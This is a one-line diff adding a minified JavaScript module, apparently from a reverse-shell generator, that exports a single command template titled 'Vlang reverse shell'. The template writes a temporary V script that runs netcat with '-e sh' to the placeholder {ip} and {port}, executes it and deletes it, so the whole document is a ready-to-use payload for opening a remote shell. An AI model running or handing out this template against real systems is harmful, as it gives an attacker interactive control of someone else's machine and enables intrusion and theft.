@@ -1,0 +1,1 @@
+const e=[{title:"Vlang reverse shell",template:`echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh {ip} {port} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v`,description:"Vlang reverse shell that creates and runs a temporary V script using nc."}],t={commands:e};export{e as commands,t as default};
